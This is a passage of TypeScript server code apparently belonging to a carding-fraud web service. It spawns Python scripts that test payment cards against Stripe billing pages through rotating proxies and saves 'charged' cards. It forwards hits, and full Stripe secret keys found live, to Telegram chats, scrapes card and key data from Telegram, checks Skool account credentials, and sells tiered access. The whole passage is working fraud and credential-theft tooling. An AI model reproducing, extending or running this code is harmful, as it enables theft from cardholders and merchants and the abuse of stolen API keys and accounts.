      if (!billingHitterCheck.allowed) {
        return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: billingHitterCheck.limit, used: billingHitterCheck.used });
      }
      const billingReqIp = getClientIp(req);
      if (billingHitterCheck.limit !== -1) {
        const billingIpCheck = checkIpHitterLimit(billingReqIp);
        if (!billingIpCheck.allowed) {
          return res.status(429).json({ error: "HITTER_LIMIT_REACHED", limit: 2, used: billingIpCheck.used, reason: "IP daily limit reached" });
        }
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_stripe_billing.py");

      const args = ["-u", script, billingUrl, card];
      const allowedCacheKeys = ["pk", "ek", "portal_session_id", "merchant"];
      if (sessionCache && typeof sessionCache === "object" && !Array.isArray(sessionCache)) {
        const sanitized: Record<string, any> = {};
        for (const key of allowedCacheKeys) {
          if (key in sessionCache) sanitized[key] = sessionCache[key];
        }
        args.push(JSON.stringify(sanitized));
      } else {
        args.push("null");
      }

      const userId = req.session?.userId || "";
      let proxy = "";
      try {
        const uProxies = loadUserProxies()[userId]?.proxies || [];
        if (uProxies.length > 0) {
          const idx = proxyRotationIndex.get(userId) || 0;
          proxy = uProxies[idx % uProxies.length];
          proxyRotationIndex.set(userId, idx + 1);
        }
      } catch {}
      args.push(proxy || "null");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let settled = false;
        const proc = spawn("python3", args, {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 90000,
        });

        const cleanup = () => {
          if (!settled && !res.writableEnded) {
            settled = true;
            try { proc.kill("SIGTERM"); } catch {}
            setTimeout(() => { try { proc.kill("SIGKILL"); } catch {} }, 2000);
            reject(new Error("Client disconnected"));
          }
        };
        req.socket?.on("close", cleanup);

        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        let stderrBuf = "";
        proc.stderr?.on("data", (data: Buffer) => { stderrBuf += data.toString(); });
        proc.on("close", (code) => {
          if (settled) return;
          settled = true;
          req.socket?.removeListener("close", cleanup);
          if (stderrBuf.trim()) {
            const lines = stderrBuf.trim().split("\n").slice(-15);
            console.log(`[stripe-billing-debug] ${lines.join("\n[stripe-billing-debug] ")}`);
          }
          if (output.trim()) resolve(output.trim());
          else reject(new Error("Stripe Billing check failed"));
        });
        proc.on("error", (err) => {
          if (settled) return;
          settled = true;
          req.socket?.removeListener("close", cleanup);
          reject(err);
        });
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid response" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });

      const cardClean = card.replace(/\|/g, "|");
      const userName = [req.session?.firstName, req.session?.lastName].filter(Boolean).join(" ") || req.session?.username || req.session?.userId || "";

      if ((data.status === "charged" || data.status === "approved") && req.session?.userId) {
        const botDir2 = path.resolve(process.cwd(), "bot");
        const forwardScript = path.join(botDir2, "web_forward_hit.py");
        const freshCache = data.session_cache || {};
        const site = freshCache.merchant || sessionCache?.merchant || "";
        const billingResponse = data.message || (data.status === "charged" ? "Charged" : "Approved");

        spawn("python3", ["-u", forwardScript, req.session.userId, cardClean, "Stripe Billing", billingResponse, userName, site, "", billingUrl.slice(0, 120)], {
          cwd: botDir2,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 15000,
          stdio: "ignore",
        });

        incrementUsage(req.session.userId, "hitterHits");
        incrementIpHitterUsage(billingReqIp);
        if (data.status === "charged") {
          saveChargedCC(cardClean, "Stripe Billing", req.session.userId, userName);
        }
        sendGroupLog(userName, req.session.userId, cardClean, "Stripe Billing", data.message || (data.status === "charged" ? "Charged" : "Approved"), "auto_hitter", site);
        addActivity({
          type: "hit",
          userName,
          userId: req.session.userId,
          message: `${userName} Got Hit ⚡`,
          detail: `${data.status === "charged" ? "Charged" : "Approved"} — Stripe Billing`,
        });
      }

      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Stripe Billing failed" });
    }
  });

  app.post("/api/admin/fake-logs/fetch", requireAdmin, async (req, res) => {
    try {
      const { checkoutUrl } = req.body;
      if (!checkoutUrl || typeof checkoutUrl !== "string") {
        return res.status(400).json({ error: "Missing checkout URL" });
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_fake_log.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        const proc = spawn("python3", ["-u", script, "fetch", checkoutUrl], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 30000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => {
          if (output.trim()) resolve(output.trim());
          else reject(new Error("Failed to fetch checkout info"));
        });
        proc.on("error", (err) => reject(err));
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid response" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });
      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Failed to fetch checkout info" });
    }
  });

  app.post("/api/admin/fake-logs/send", requireAdmin, async (req, res) => {
    try {
      const { card, site, amount } = req.body;
      if (!card || typeof card !== "string") {
        return res.status(400).json({ error: "Missing card" });
      }
      const userName = [req.session!.firstName, req.session!.lastName].filter(Boolean).join(" ") || req.session!.userId;
      const userId = req.session!.userId;

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_fake_log.py");

      const sendResult = await new Promise<string>((resolve, reject) => {
        let output = "";
        const proc = spawn("python3", ["-u", script, "send", userName, userId, card, site || "", amount || ""], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 15000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => resolve(output.trim()));
        proc.on("error", (err) => reject(err));
      });

      let sendData: any = { sent: false, error: "No response" };
      try {
        sendData = JSON.parse(sendResult);
      } catch {}

      res.json({ ...sendData, card });
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Failed to send fake log" });
    }
  });

  app.post("/api/tools/scrape", requireAuth, async (req, res) => {
    try {
      const { type, chatId, limit } = req.body;
      if (!type || !chatId) {
        return res.status(400).json({ error: "Missing type or chatId" });
      }
      if (!["cc", "sk"].includes(type)) {
        return res.status(400).json({ error: "Type must be 'cc' or 'sk'" });
      }
      const msgLimit = Math.max(1, parseInt(limit) || 100);
      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_scraper.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let settled = false;
        const proc = spawn("python3", ["-u", script, type, String(chatId).trim(), String(msgLimit)], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 300000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => {
          if (settled) return;
          settled = true;
          if (output.trim()) resolve(output.trim());
          else reject(new Error("Scraper returned no output"));
        });
        proc.on("error", (err) => {
          if (settled) return;
          settled = true;
          reject(err);
        });
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid scraper response" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });
      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Scraper failed" });
    }
  });

  app.post("/api/tools/check-sk", requireAuth, async (req, res) => {
    try {
      const { sk } = req.body;
      if (!sk || typeof sk !== "string") {
        return res.status(400).json({ error: "Missing SK key" });
      }
      const skClean = sk.trim();
      if (!/^(sk_live_|sk_test_|rk_live_|rk_test_)\w{10,}$/.test(skClean)) {
        return res.status(400).json({ error: "Invalid SK format" });
      }

      const botSettings = botManager.getBotSettings();
      const skCheckerEnabled = botSettings?.tool_settings?.sk_scraper_checker?.enabled !== false;
      if (!skCheckerEnabled) {
        return res.status(403).json({ error: "SK Scraper Checker is disabled by admin" });
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "web_sk_checker.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let settled = false;
        const proc = spawn("python3", ["-u", script, skClean], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 30000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => {
          if (settled) return;
          settled = true;
          if (output.trim()) resolve(output.trim());
          else reject(new Error("SK checker returned no output"));
        });
        proc.on("error", (err) => {
          if (settled) return;
          settled = true;
          reject(err);
        });
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Invalid SK checker response" });
      const data = JSON.parse(jsonLine);
      if (data.error) return res.status(400).json({ error: data.error });

      if (data.status === "live") {
        const sessionAny = req.session as any;
        const userName = [sessionAny?.firstName, sessionAny?.lastName].filter(Boolean).join(" ") || sessionAny?.username || req.session?.userId;
        const botToken = getConfigValue("TELEGRAM_BOT_TOKEN");
        const adminId = getConfigValue("TELEGRAM_ADMIN_ID");
        const groupId = getConfigValue("TELEGRAM_GROUP_ID");

        if (botToken && groupId) {
          const logMsg = `🔑 Live SK Found!\n\n` +
            `👤 User: ${userName} (${req.session?.userId})\n` +
            `💰 Balance: ${data.available || "N/A"}\n` +
            `🏢 Business: ${data.business_name || "N/A"}\n` +
            `🌐 URL: ${data.business_url || "N/A"}\n` +
            `💳 Charges: ${data.charges_enabled ? "Enabled" : "Disabled"}`;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: parseInt(groupId),
              text: logMsg,
              disable_web_page_preview: true,
            }),
          }).catch(() => {});
        }

        if (botToken && adminId) {
          const adminMsg = `🔑🔑 Live SK Found 🔑🔑\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `🔐 SK: ${skClean}\n` +
            `💰 Available: ${data.available || "N/A"}\n` +
            `💰 Pending: ${data.pending || "N/A"}\n` +
            `💱 Currency: ${data.currency || "N/A"}\n` +
            `🌍 Country: ${data.country || "N/A"}\n` +
            `🏢 Business: ${data.business_name || "N/A"}\n` +
            `🌐 URL: ${data.business_url || "N/A"}\n` +
            `💳 Charges: ${data.charges_enabled ? "Enabled" : "Disabled"}\n` +
            `🆔 Account: ${data.account_id || "N/A"}\n` +
            `━━━━━━━━━━━━━━━━━━━━\n` +
            `👤 Found by: ${userName} (${req.session?.userId})`;

          fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              chat_id: parseInt(adminId),
              text: adminMsg,
              disable_web_page_preview: true,
            }),
          }).catch(() => {});
        }
      }

      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "SK check failed" });
    }
  });

  app.get("/api/tools/sk-checker-status", requireAuth, (_req, res) => {
    const botSettings = botManager.getBotSettings();
    const enabled = botSettings?.tool_settings?.sk_scraper_checker?.enabled !== false;
    res.json({ enabled });
  });

  app.get("/api/tools/scraper-session-status", requireAdmin, (_req, res) => {
    const sessionPath = path.resolve(process.cwd(), "bot", "scraper_user.session");
    res.json({ hasSession: fs.existsSync(sessionPath) });
  });

  app.post("/api/tools/scraper-session/send-code", requireAdmin, async (req, res) => {
    try {
      const { phone } = req.body;
      if (!phone) return res.status(400).json({ error: "Phone number required" });

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "scraper_session_api.py");

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let settled = false;
        const proc = spawn("python3", ["-u", script, "send_code", phone], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 30000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => { if (!settled) { settled = true; resolve(output.trim()); } });
        proc.on("error", (err) => { if (!settled) { settled = true; reject(err); } });
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Failed to send code" });
      const data = JSON.parse(jsonLine);
      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Failed to send code" });
    }
  });

  app.post("/api/tools/scraper-session/verify", requireAdmin, async (req, res) => {
    try {
      const { phone, code, phoneCodeHash, password } = req.body;
      if (!phone || !code || !phoneCodeHash) {
        return res.status(400).json({ error: "Phone, code, and phoneCodeHash required" });
      }

      const botDir = path.resolve(process.cwd(), "bot");
      const script = path.join(botDir, "scraper_session_api.py");

      const args = ["verify", phone, code, phoneCodeHash];
      if (password) args.push(password);

      const result = await new Promise<string>((resolve, reject) => {
        let output = "";
        let settled = false;
        const proc = spawn("python3", ["-u", script, ...args], {
          cwd: botDir,
          env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
          timeout: 30000,
        });
        proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
        proc.stderr?.on("data", () => {});
        proc.on("close", () => { if (!settled) { settled = true; resolve(output.trim()); } });
        proc.on("error", (err) => { if (!settled) { settled = true; reject(err); } });
      });

      const lines = result.split("\n");
      const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
      if (!jsonLine) return res.status(500).json({ error: "Verification failed" });
      const data = JSON.parse(jsonLine);
      res.json(data);
    } catch (err: any) {
      res.status(500).json({ error: err.message || "Verification failed" });
    }
  });

  function runPythonScript(scriptPath: string, args: string[], cwd: string, timeout = 15000): Promise<string> {
    return new Promise((resolve, reject) => {
      let output = "";
      let stderr = "";
      const proc = spawn("python3", ["-u", scriptPath, ...args], {
        cwd,
        env: { ...process.env, PYTHONUNBUFFERED: "1" } as Record<string, string>,
        timeout,
      });
      proc.stdout?.on("data", (data: Buffer) => { output += data.toString(); });
      proc.stderr?.on("data", (data: Buffer) => { stderr += data.toString(); });
      proc.on("close", () => {
        if (output.trim()) resolve(output.trim());
        else {
          const stderrTail = stderr.trim().split("\n").slice(-5).join("\n");
          reject(new Error(stderrTail || "Script returned no output"));
        }
      });
      proc.on("error", (err) => reject(err));
    });
  }

  function parseLastJson(output: string) {
    const lines = output.split("\n");
    const jsonLine = lines.reverse().find(l => l.trim().startsWith("{"));
    if (!jsonLine) throw new Error("Invalid response");
    return JSON.parse(jsonLine);
  }

  const botDir = path.resolve(process.cwd(), "bot");

  app.get("/api/shopify/sites", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const script = path.join(botDir, "web_shopify_sites.py");
      const output = await runPythonScript(script, ["list", userId], botDir);
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/shopify/sites", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const { urls } = req.body;
      if (!urls || !Array.isArray(urls) || urls.length === 0) {
        return res.status(400).json({ error: "Provide an array of URLs" });
      }
      const cleanUrls = urls.map((u: string) => String(u).trim()).filter((u: string) => u.length > 0).slice(0, 50);
      const script = path.join(botDir, "web_shopify_sites.py");
      const output = await runPythonScript(script, ["add", userId, ...cleanUrls], botDir);
      await saveJsonFile("user_sites.json");
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.delete("/api/shopify/sites", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const { url } = req.body;
      if (!url) {
        return res.status(400).json({ error: "Provide URL to remove" });
      }
      const script = path.join(botDir, "web_shopify_sites.py");
      const output = await runPythonScript(script, ["remove", userId, url], botDir);
      await saveJsonFile("user_sites.json");
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.delete("/api/shopify/sites/all", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const script = path.join(botDir, "web_shopify_sites.py");
      const output = await runPythonScript(script, ["clear", userId], botDir);
      await saveJsonFile("user_sites.json");
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/skool/accounts", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const isAdmin = req.session!.isAdmin ? "true" : "false";
      const script = path.join(botDir, "web_skool_accounts.py");
      const output = await runPythonScript(script, ["list", userId, isAdmin], botDir);
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/skool/accounts", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const isAdmin = req.session!.isAdmin ? "true" : "false";
      const { email, password } = req.body;
      if (!email || !password) {
        return res.status(400).json({ error: "Email and password required" });
      }
      const script = path.join(botDir, "web_skool_accounts.py");
      const output = await runPythonScript(script, ["add", userId, isAdmin, email, password], botDir);
      await Promise.all([
        saveJsonFile("skool_accounts.json"),
        saveJsonFile("user_skool_accounts.json"),
        saveJsonFile("skool_status.json"),
      ]);
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/skool/accounts/check", requireAuth, async (req, res) => {
    try {
      const { email, password } = req.body;
      if (!email || !password) {
        return res.status(400).json({ error: "Email and password required" });
      }
      const script = path.join(botDir, "web_check_skool.py");
      const output = await runPythonScript(script, [email, password], botDir, 60000);
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.delete("/api/skool/accounts", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const isAdmin = req.session!.isAdmin ? "true" : "false";
      const { email } = req.body;
      if (!email) {
        return res.status(400).json({ error: "Email required" });
      }
      const script = path.join(botDir, "web_skool_accounts.py");
      const output = await runPythonScript(script, ["remove", userId, isAdmin, email], botDir);
      await Promise.all([
        saveJsonFile("skool_accounts.json"),
        saveJsonFile("user_skool_accounts.json"),
      ]);
      res.json(parseLastJson(output));
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/user/dashboard", requireAuth, async (req, res) => {
    try {
      const userId = req.session!.userId;
      const botDirPath = path.resolve(process.cwd(), "bot");

      let totalUsers = 0;
      try {
        const usersFile = path.join(botDirPath, "users.json");
        if (fs.existsSync(usersFile)) {
          const users = JSON.parse(fs.readFileSync(usersFile, "utf-8"));
          totalUsers = Object.keys(users).length;
        }
      } catch {}

      let totalHits = 0;
      let userHits = 0;
      const hitCounts: Record<string, number> = {};
      try {
        const chargedFile = path.join(botDirPath, "charged_ccs.json");
        if (fs.existsSync(chargedFile)) {
          const charged = JSON.parse(fs.readFileSync(chargedFile, "utf-8"));
          totalHits = charged.length;
          for (const entry of charged) {
            const uid = String(entry.user_id || "");
            hitCounts[uid] = (hitCounts[uid] || 0) + 1;
            if (uid === userId) userHits++;
          }
        }
      } catch {}

      const sortedUsers = Object.entries(hitCounts)
        .sort(([, a], [, b]) => (b as number) - (a as number));
      let userRank = 0;
      for (let i = 0; i < sortedUsers.length; i++) {
        if (sortedUsers[i][0] === userId) {
          userRank = i + 1;
          break;
        }
      }
      if (userRank === 0 && userHits === 0) {
        userRank = sortedUsers.length + 1;
      }

      let userRole = "Free";
      let premiumExpiry: string | null = null;
      const isAdmin = req.session!.isAdmin;
      if (isAdmin) {
        userRole = "Admin";
      } else {
        try {
          const premiumFile = path.join(botDirPath, "premium.json");
          if (fs.existsSync(premiumFile)) {
            const premiumData = JSON.parse(fs.readFileSync(premiumFile, "utf-8"));
            const userPremium = premiumData[userId];
            if (userPremium && userPremium.expiry) {
              const expiry = new Date(userPremium.expiry);
              if (expiry > new Date()) {
                userRole = "Premium";
                premiumExpiry = userPremium.expiry;
              }
            }
          }
        } catch {}
      }

      const tier = getUserTier(userId);
      const tierLimits = getTierLimits(tier);
      const usage = getUserDailyUsage(userId);

      res.json({
        totalUsers,
        totalHits,
        userHits,
        userRank,
        userRole,
        premiumExpiry,
        tier,
        tierLimits,
        dailyUsage: {
          checks: usage.checks,
          shopifyChecks: usage.shopifyChecks,
          findsiteSearches: usage.findsiteSearches,
          accountMassChecks: usage.accountMassChecks,
          hitterHits: usage.hitterHits,
        },
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/user/tier", requireAuth, (req, res) => {
    try {
      const userId = req.session?.userId || "";
      const tier = getUserTier(userId);
      const limits = getTierLimits(tier);
      const usage = getUserDailyUsage(userId);
      res.json({
        tier,
        limits,
        usage: {
          checks: usage.checks,
          shopifyChecks: usage.shopifyChecks,
          findsiteSearches: usage.findsiteSearches,
          accountMassChecks: usage.accountMassChecks,
        },
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.get("/api/admin/tiers", requireAdmin, (_req, res) => {
    try {
      const tiers = loadUserTiers();
      const botDir = path.resolve(process.cwd(), "bot");
      const usersFile = path.join(botDir, "users.json");
      let allUsers: Record<string, any> = {};
      try {
        if (fs.existsSync(usersFile)) {
          allUsers = JSON.parse(fs.readFileSync(usersFile, "utf-8"));
        }
      } catch {}

      const result = Object.keys(allUsers).map(uid => ({
        userId: uid,
        tier: getUserTier(uid),
        assignedBy: tiers[uid]?.assignedBy || null,
        assignedAt: tiers[uid]?.assignedAt || null,
        isAdmin: isAdminUser(uid),
      }));

      res.json(result);
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  app.post("/api/admin/tiers", requireAdmin, (req, res) => {
    try {
      const { userId, tier } = req.body;
      if (!userId || typeof userId !== "string") {
        return res.status(400).json({ error: "Missing userId" });
      }
      if (!["free", "silver", "gold"].includes(tier)) {
        return res.status(400).json({ error: "Invalid tier. Must be free, silver, or gold." });
      }

      const tiers = loadUserTiers();
      if (tier === "free") {
        delete tiers[userId];
      } else {
        tiers[userId] = {
          tier: tier as UserTier,
          assignedBy: req.session?.userId || "",
          assignedAt: new Date().toISOString(),
        };
      }
      saveUserTiers(tiers);
      res.json({ success: true, userId, tier });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // POST /api/admin/referral/credit  — manually credit referral balance to a user
  app.post("/api/admin/referral/credit", requireAdmin, (req, res) => {
    try {
      const { userId, amount, note } = req.body;
      if (!userId || typeof userId !== "string") {
        return res.status(400).json({ error: "Missing userId" });
      }
      const parsed = parseFloat(amount);
      if (isNaN(parsed) || parsed <= 0) {
        return res.status(400).json({ error: "Amount must be a positive number" });
      }
      const data = loadReferrals();
      const entry = getReferralEntry(data, userId);
      entry.balance = parseFloat((entry.balance + parsed).toFixed(2));
      entry.totalEarned = parseFloat((entry.totalEarned + parsed).toFixed(2));
      // Log as a manual credit in redeemedHistory with negative amount = they received it
      entry.redeemedHistory.push({
        plan: `admin_credit${note ? ": " + note : ""}`,
        amount: -parsed,
        redeemedAt: new Date().toISOString(),
      });
      saveReferrals(data);
      res.json({ success: true, userId, credited: parsed, newBalance: entry.balance });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  // GET /api/admin/referral/stats  — overview of all referral users
  app.get("/api/admin/referral/stats", requireAdmin, (_req, res) => {
    try {
      const data = loadReferrals();
      const rows = Object.entries(data.users).map(([userId, e]) => ({
        userId,
        balance: e.balance,
        totalEarned: e.totalEarned,
        referredCount: e.referredCount,
        referredUsers: e.referredUsers,
      }));
      // Sort by totalEarned desc
      rows.sort((a, b) => b.totalEarned - a.totalEarned);
      res.json({ rows, totalUsedBy: Object.keys(data.usedBy).length });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  const keysFilePath = path.join(path.resolve(process.cwd(), "bot"), "keys.json");

  function loadKeys(): Record<string, any> {
    try {
      if (fs.existsSync(keysFilePath)) {
        return JSON.parse(fs.readFileSync(keysFilePath, "utf-8"));
      }
    } catch {}
    return {};
  }

  function saveKeys(data: Record<string, any>) {
    fs.writeFileSync(keysFilePath, JSON.stringify(data, null, 2));
    debouncedSaveJson();
  }

  app.post("/api/redeem", requireAuth, async (req, res) => {
    try {
      const userId = req.session?.userId || "";
      const sessionAny = req.session as any;
      const userName = [sessionAny?.firstName, sessionAny?.lastName].filter(Boolean).join(" ") || sessionAny?.username || userId;
      const { key } = req.body;
      if (!key || typeof key !== "string") {
        return res.status(400).json({ error: "Missing redemption key" });
      }
      const upperKey = key.trim().toUpperCase();
      const keysData = loadKeys();

      if (!keysData[upperKey]) {
        return res.status(400).json({ error: "Invalid key! This key does not exist." });
      }
      if (keysData[upperKey].used) {
        return res.status(400).json({ error: "This key has already been redeemed." });
      }

      const plan = keysData[upperKey].plan || "silver";
      const keyHours: number | undefined = keysData[upperKey].hours;
      const days = keysData[upperKey].days || 7;
      const useHours = keyHours !== undefined && keyHours !== null;

      const currentTier = getUserTier(userId);
      const tierRank: Record<string, number> = { free: 0, silver: 1, gold: 2 };

      if (currentTier !== "free") {
        const tiers = loadUserTiers();
        const entry = tiers[userId];
        const expiresAt = entry?.expiresAt ? new Date(entry.expiresAt) : null;
        const isActive = expiresAt && expiresAt.getTime() > Date.now();

        if (isActive && tierRank[currentTier] > tierRank[plan]) {
          return res.status(400).json({ error: `You already have a higher plan (${currentTier}). Cannot redeem a ${plan} key.` });
        }
        if (isActive && tierRank[currentTier] === tierRank[plan]) {
          const daysLeft = Math.ceil((expiresAt!.getTime() - Date.now()) / (1000 * 60 * 60 * 24));
          return res.status(400).json({ error: `You already have an active ${currentTier} plan (${daysLeft} day${daysLeft !== 1 ? "s" : ""} remaining). Wait for it to expire or upgrade to a higher plan.` });
        }
      }

      keysData[upperKey].used = true;
      keysData[upperKey].used_by = userId;
      keysData[upperKey].used_at = new Date().toISOString();
      saveKeys(keysData);

      const tiers = loadUserTiers();
      const expiresAt = useHours
        ? new Date(Date.now() + keyHours! * 60 * 60 * 1000).toISOString()
        : new Date(Date.now() + days * 24 * 60 * 60 * 1000).toISOString();
      tiers[userId] = useHours
        ? { tier: plan as UserTier, assignedBy: "key_redeem", assignedAt: new Date().toISOString(), expiresAt, hours: keyHours } as any
        : { tier: plan as UserTier, assignedBy: "key_redeem", assignedAt: new Date().toISOString(), expiresAt, days } as any;
      saveUserTiers(tiers);

      const premiumFilePath = path.join(path.resolve(process.cwd(), "bot"), "premium.json");
      try {
        let premiumData: Record<string, any> = {};
        if (fs.existsSync(premiumFilePath)) {
          premiumData = JSON.parse(fs.readFileSync(premiumFilePath, "utf-8"));
        }
        premiumData[userId] = useHours
          ? { expiry: expiresAt, added_by: "web_redeem", hours: keyHours }
          : { expiry: expiresAt, added_by: "web_redeem", days };
        fs.writeFileSync(premiumFilePath, JSON.stringify(premiumData, null, 2));
        debouncedSaveJson();
      } catch {}

      const botDir = path.resolve(process.cwd(), "bot");
      const pythonPath = process.env.PYTHON_PATH || "python3";
      const durationDisplay = useHours ? String(keyHours) + "h" : String(days);

      execFile(pythonPath, [path.join(botDir, "send_invoice.py"), "invoice", userId, plan, durationDisplay, upperKey], { timeout: 15000 }, () => {});
      execFile(pythonPath, [path.join(botDir, "send_invoice.py"), "log", userId, userName, plan, durationDisplay], { timeout: 15000 }, () => {});

      const planName = plan.charAt(0).toUpperCase() + plan.slice(1);
      const durationMsg = useHours
        ? `${keyHours} hour${keyHours === 1 ? "" : "s"}`
        : `${days} day${days === 1 ? "" : "s"}`;
      res.json({
        success: true,
        plan,
        days: useHours ? 0 : days,
        hours: useHours ? keyHours : undefined,
        expiresAt,
        message: `${planName} plan activated for ${durationMsg}!`,
      });
    } catch (err: any) {
      res.status(500).json({ error: err.message });
    }
  });

  const userSkFile = path.join(path.resolve(process.cwd(), "bot"), "user_sk_keys.json");

  function loadSkKeys(): Record<string, string[]> {
    try {
      if (fs.existsSync(userSkFile)) {
        return JSON.parse(fs.readFileSync(userSkFile, "utf-8"));
      }
    } catch {}
    return {};
  }

function saveSkKeys(data: Record<string, string[]>) {
  fs.writeFileSync(userSkFile, JSON.stringify(data, null, 2));
  saveJsonFile("user_sk_keys.json").catch(() => {});
  debouncedSaveJson();
}

  // ── Referral Program ──────────────────────────────────────────────────────
  const referralsFile = path.join(path.resolve(process.cwd(), "bot"), "referrals.json");

  interface ReferralEntry {
    balance: number;
    totalEarned: number;
    referredCount: number;
    referredUsers: string[];
    redeemedHistory: { plan: string; amount: number; redeemedAt: string }[];
  }
  interface ReferralsData {
    users: Record<string, ReferralEntry>;
    usedBy: Record<string, string>;       // newUserId -> referrerId
    ipUsed: Record<string, string[]>;     // ip -> list of newUserIds that applied referral from this IP
  }

  function loadReferrals(): ReferralsData {
    try {
      if (fs.existsSync(referralsFile)) {
        const d = JSON.parse(fs.readFileSync(referralsFile, "utf-8"));
        if (!d.ipUsed) d.ipUsed = {};
        return d;
      }
    } catch {}
    return { users: {}, usedBy: {}, ipUsed: {} };
  }

  function saveReferrals(data: ReferralsData) {
    fs.writeFileSync(referralsFile, JSON.stringify(data, null, 2));
    // Immediately persist to DB so data survives server restarts/deploys.
    saveJsonFile("referrals.json").catch(() => {});
  }

  function getReferralCode(userId: string) {
    return "REF" + userId;
  }

  function getReferralEntry(data: ReferralsData, userId: string): ReferralEntry {
    if (!data.users[userId]) {
      data.users[userId] = { balance: 0, totalEarned: 0, referredCount: 0, referredUsers: [], redeemedHistory: [] };
    }
    return data.users[userId];
  }

  // GET /api/referral — get current user's referral stats
  app.get("/api/referral", requireAuth, (req, res) => {
    const userId = req.session!.userId;
